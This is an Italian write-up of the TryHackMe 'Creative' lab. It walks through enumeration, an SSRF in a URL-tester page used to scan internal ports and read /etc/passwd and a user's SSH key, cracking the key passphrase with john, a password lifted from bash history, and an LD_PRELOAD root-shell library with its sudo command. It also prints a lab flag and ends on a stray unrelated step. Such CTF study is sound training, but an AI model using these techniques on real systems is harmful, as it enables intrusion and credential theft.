
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/creative

Sfrutta un'applicazione web vulnerabile e alcune configurazioni errate per ottenere privilegi di root.

```
nmap -Pn -vv -O 10.10.6.231
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

```

```
nmap -sVC -v -p22,80 10.10.6.231
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 80:ce:d1:3b:f1:c5:b0:4c:c3:aa:c4:61:c4:6d:2a:e3 (RSA)
|   256 af:ad:72:56:91:7d:9c:ed:4f:43:73:3d:b3:de:1b:cb (ECDSA)
|_  256 d1:15:27:ae:cc:c4:48:93:76:a0:9c:19:00:ab:5e:e5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://creative.thm
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
aggiungiamo il dominio al file hosts
```
echo "10.10.6.231    creative.thm" >> /etc/hosts
```

```
http://creative.thm/
```

facciamo un pò di enumerazione e cerchiamo se esistono sottodomini

```bash
gobuster vhost -k --domain creative.thm --append-domain -u http://10.10.6.231 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
```
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# gobuster vhost -k --domain creative.thm --append-domain -u http://10.10.6.231 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://10.10.6.231
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: beta.creative.thm Status: 200 [Size: 591]
Progress: 114441 / 114442 (100.00%)
===============================================================
Finished

```
abbiamo trovato 
```
beta.creative.thm
```
aggiungiamolo al file hosts

```
echo "10.10.6.231    beta.creative.thm" >> /etc/hosts
```

Enumeriamo file e directory
```bash
gobuster dir -u http://creative.thm -w /usr/share/SecLists/Discovery/Web-Content/big.txt -o creative_thm.txt -t 100
```

```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# gobuster dir -u http://creative.thm -w /usr/share/SecLists/Discovery/Web-Content/big.txt -o creative_thm.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://creative.thm
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 178] [--> http://creative.thm/assets/]
Progress: 20476 / 20477 (100.00%)
===============================================================
Finished

```

vediamo cosa abbiamo su
http://beta.creative.thm/

FAcciamo ctrl+v e controlliamo il sorgente della pagina
```
<!DOCTYPE html>
<html>
<head>
  <title>URL Tester</title>
  <link rel="stylesheet" type="text/css" href="[css/style.css](view-source:http://beta.creative.thm/css/style.css)">
</head>
<body>
  <div class="container">
    <h1>Beta URL Tester</h1>
    <p>This page provides the functionality that allows you to test a URL to see if it is alive. Enter a URL in the form below and click "Submit" to test it.</p>
    <form action="[/](view-source:http://beta.creative.thm/)" method="POST">
      <label for="url">Enter URL:</label>
      <input type="text" id="url" name="url" placeholder="http://example.com">
      <input type="submit" value="Submit">
    </form>
  </div>
</body>
</html>
```
Quello che inserisci nel campo di input verrà inviato come un `HTTP POST`a `http://beta.creative.thm/`.


proviamo quindi ad inserire 
```
http://127.0.0.1
```
ed otteniamo
```
# Creative Studio

[Our Service](http://beta.creative.thm/#service) [Contact Us](http://beta.creative.thm/#contact)

###### UX/UI Design

Lorem ipsum dolor sit amet, consectetur adipisicing elit. Omnis excepturi, repellat esse laborum explicabo quia.

###### Web Development.........................................
```
proviamo a effettuare la stessa cosa ma con curl

```
curl -X POST 'http://beta.creative.thm' -d 'url=http://127.0.0.1'
```

creiamo un server in python e vediamo se possiamo riceverci anche le richieste effettuate dal sito
```
python3 -m http.server 80
```
inseriamo in http://beta.creative.thm/
```
http://10.14.99.134
```
ed otteniamo 
```
└─# python3 -m http.server 80                                 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.6.231 - - [03/Sep/2025 15:25:53] "GET / HTTP/1.1" 200 -

```

e sulla pagina la nostra directory
```
# Directory listing for /

---

- [.firefox/](http://beta.creative.thm/.firefox/)
```

scriviamo con l'aiuto della AI uno script che ci scansioni le porte aperte
```
nano test.sh
```
```
#!/bin/bash

# Indirizzo IP da controllare
IP="127.0.0.1"
# Intervallo delle porte da controllare
START_PORT=1300
END_PORT=1400

# Array per memorizzare le porte aperte
open_ports=()

# Scansione delle porte
for ((port=START_PORT; port<=END_PORT; port++)); do
    # Visualizza la porta attualmente scansionata
    echo "Scansione della porta: $port"
    
    # Invia la richiesta POST e cattura la risposta
    response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://beta.creative.thm" -d "url=http://$IP:$port")
    
    # Controlla se la risposta è 200 (OK)
    if [ "$response" -eq 200 ]; then
        # Controlla il contenuto della risposta per confermare che la porta sia aperta
        content=$(curl -s -X POST "http://beta.creative.thm" -d "url=http://$IP:$port")
        if [[ "$content" != *"Dead"* ]]; then
            open_ports+=($port)  # Aggiungi la porta all'array se aperta
            echo "Porta $port aperta."
        else
            echo "Porta $port chiusa o non raggiungibile."
        fi
    else
        echo "Porta $port chiusa o non raggiungibile."
    fi
done

# Stampa le porte aperte
if [ ${#open_ports[@]} -eq 0 ]; then
    echo "Nessuna porta aperta trovata."
else
    echo "Porte aperte: ${open_ports[@]}"
fi

```

```
chmod +x test.sh
```

```
Scansione della porta: 1397
Porta 1397 chiusa o non raggiungibile.
Scansione della porta: 1398
Porta 1398 chiusa o non raggiungibile.
Scansione della porta: 1399
Porta 1399 chiusa o non raggiungibile.
Scansione della porta: 1400
Porta 1400 chiusa o non raggiungibile.
Porte aperte: 1337
```

abbiamo trovato la porta aperta 1337

```
curl -X POST 'http://beta.creative.thm' -d 'url=http://127.0.0.1:1337'
```

```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# curl -X POST 'http://beta.creative.thm' -d 'url=http://127.0.0.1:1337'
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href="bin/">bin@</a></li>
<li><a href="boot/">boot/</a></li>
<li><a href="dev/">dev/</a></li>
<li><a href="etc/">etc/</a></li>
<li><a href="home/">home/</a></li>
<li><a href="lib/">lib@</a></li>
<li><a href="lib32/">lib32@</a></li>
<li><a href="lib64/">lib64@</a></li>
<li><a href="libx32/">libx32@</a></li>
<li><a href="lost%2Bfound/">lost+found/</a></li>
<li><a href="media/">media/</a></li>
<li><a href="mnt/">mnt/</a></li>
<li><a href="opt/">opt/</a></li>
<li><a href="proc/">proc/</a></li>
<li><a href="root/">root/</a></li>
<li><a href="run/">run/</a></li>
<li><a href="sbin/">sbin@</a></li>
<li><a href="snap/">snap/</a></li>
<li><a href="srv/">srv/</a></li>
<li><a href="swap.img">swap.img</a></li>
<li><a href="sys/">sys/</a></li>
<li><a href="tmp/">tmp/</a></li>
<li><a href="usr/">usr/</a></li>
<li><a href="var/">var/</a></li>
</ul>
<hr>
</body>
</html>

```

proviamo a vedere se raggiungiamo il file passwd

```
curl -X POST 'http://beta.creative.thm' -d 'url=http://127.0.0.1:1337/etc/passwd'
```

```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# curl -X POST 'http://beta.creative.thm' -d 'url=http://127.0.0.1:1337/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
saad:x:1000:1000:saad:/home/saad:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash

```

c'è un utente che si chiama "saad" (UID 1000)

Visto che sulla scansione iniziale con nmap abbiamo trovato aperta la porta ssh proviamo a vedere se troviamo la chiave di saad

```
curl -X POST 'http://beta.creative.thm' -d 'url=http://127.0.0.1:1337/home/saad/.ssh/id_rsa'
```

```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# curl -X POST 'http://beta.creative.thm' -d 'url=http://127.0.0.1:1337/home/saad/.ssh/id_rsa'
-----BEGIN OPENSSH PRIVATE KEY-----
xxxxxxxxxxxxxxxxxxxx
-----END OPENSSH PRIVATE KEY-----

```

perfetto copiamo la chiave in un file id_rsa che ci creiamo sul nostro kali

```
nano id_rsa
```
```
-----BEGIN OPENSSH PRIVATE KEY-----
xxxxxxxxxxxxxxxxxx
-----END OPENSSH PRIVATE KEY-----
```

```
sudo chmod 600 id_rsa
```

```
ssh -i id_rsa saad@creative.thm
```
```
└─# ssh -i id_rsa saad@creative.thm
The authenticity of host 'creative.thm (10.10.214.105)' can't be established.
ED25519 key fingerprint is SHA256:jjTUBKp8W90ADeJEtK6eaGJxMnqGKqw1iJ0ZtvMj5DI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'creative.thm' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
saad@creative.thm: Permission denied (publickey).

```
La chiave è protetta da una passphrase. Possiamo provare a usare "John" per decifrarla.

==trasformiamo la chiave rsa in hash e la andiamo a decriptare sempre con john==
```
ssh2john id_rsa > id_rsa.hash
```

```
cat id_rsa.hash
```

```
john -wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

```
john --show id_rsa.hash
```
trovata password!
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# john -wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetness        (id_rsa)     
1g 0:00:00:36 DONE (2025-09-03 16:43) 0.02768g/s 26.57p/s 26.57c/s 26.57C/s blonde..sandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                           
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# john --show id_rsa.hash
id_rsa:sweetness

1 password hash cracked, 0 left

```
ci ricolleghiamo
```
ssh -i id_rsa saad@creative.thm
```
```
sweetness
```

```
aad@ip-10-10-214-105:~$ ls -al
total 52
drwxr-xr-x 7 saad saad 4096 Jan 21  2023 .
drwxr-xr-x 4 root root 4096 Sep  3 20:22 ..
-rw------- 1 saad saad  362 Jan 21  2023 .bash_history
-rw-r--r-- 1 saad saad  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 saad saad 3797 Jan 21  2023 .bashrc
drwx------ 2 saad saad 4096 Jan 20  2023 .cache
drwx------ 3 saad saad 4096 Jan 20  2023 .gnupg
drwxrwxr-x 3 saad saad 4096 Jan 20  2023 .local
-rw-r--r-- 1 saad saad  807 Feb 25  2020 .profile
drwx------ 3 saad saad 4096 Jan 20  2023 snap
drwx------ 2 saad saad 4096 Jan 21  2023 .ssh
-rwxr-xr-x 1 root root  150 Jan 20  2023 start_server.py
-rw-r--r-- 1 saad saad    0 Jan 20  2023 .sudo_as_admin_successful
-rw-rw---- 1 saad saad   33 Jan 21  2023 user.txt
saad@ip-10-10-214-105:~$ cat user.txt
9a1ce90a7653d74ab98630b47b8b4a84

```
ed abbiamo trovato la nostra prima flag!
```
9a1ce90a7653d74ab98630b47b8b4a84
```

controlliamo `sudo -l` per scalare i privilegi
ma non abbiamo una password per saad  
neanche quella utilizzata per connetterci ad ssh funziona

Tra la lista dei file notiamo `.bash_history`
**un buon posto dove cercare le password** è all'interno dei file della cronologia.

```
cat .bash_history
```

```
sudo -l
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
rm creds.txt
sudo -l
whomai
```

```
sudo -l
```
```
MyStrongestPasswordYet$4291
```

```
Matching Defaults entries for saad on ip-10-10-214-105:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-10-214-105:
    (root) /usr/bin/ping

```

Il `/usr/bin/ping`binario non è scrivibile, tuttavia l' `sudo -l`output contiene qualcosa di interessante: `env_keep+=LD_PRELOAD`.

andiamo a vedere cosa è
> LD_PRELOAD è una variabile d'ambiente opzionale utilizzata per impostare/caricare librerie condivise in un programma o script. Ciò significa che possiamo impostare il valore della variabile d'ambiente LD_PRELOAD per un programma per indicare al programma di caricare le librerie menzionate nella sua memoria prima dell'avvio.

Ora, se facciamo possiamo fare riferimento  a [questo articolo](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/) .“ld_preload privilege escalation” possiamo capire come sfruttarlo

 **creiamo un file shell.c in /tmp**

```
cd /tmp
```


```
nano shell.c
```
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

compiliamo il codice con "gcc" e specifichiamo che si tratta di una libreria condivisa:
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

```
saad@ip-10-10-214-105:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
shell.c: In function ‘_init’:
shell.c:6:1: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    6 | setgid(0);
      | ^~~~~~
shell.c:7:1: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    7 | setuid(0)
```
ignoriamo i messaggi di warning

```
sudo LD_PRELOAD=/tmp/shell.so -u root /usr/bin/ping
```
siamo diventati root! ora andiamo a caccia dell'ultima flag
```
saad@ip-10-10-159-184:/tmp$ sudo LD_PRELOAD=/tmp/shell.so -u root /usr/bin/ping
# whoami
root
# cd /root
# ls -al
total 48
drwx------  6 root root 4096 Apr 26 14:27 .
drwxr-xr-x 19 root root 4096 Sep  4 05:47 ..
-rw-------  1 root root   18 Jan 21  2023 .bash_history
-rw-r--r--  1 root root 3132 Jan 21  2023 .bashrc
drwxr-xr-x  3 root root 4096 Jan 20  2023 .cache
drwxr-xr-x  3 root root 4096 Jan 20  2023 .local
-rw-------  1 root root    1 Jan 21  2023 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root    1 Jan 21  2023 .python_history
-rw-------  1 root root   33 Jan 21  2023 root.txt
drwx------  3 root root 4096 Jan 20  2023 snap
drwx------  2 root root 4096 Apr 26 14:27 .ssh
# cat root.txt
xxxxxxxxx

```
root.txt?
```
xxxxxxxxxxxx
```

**Passaggio 2: clonare il repository SSRFmap e spostare il file request.txt nella directory del repository**

[https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)

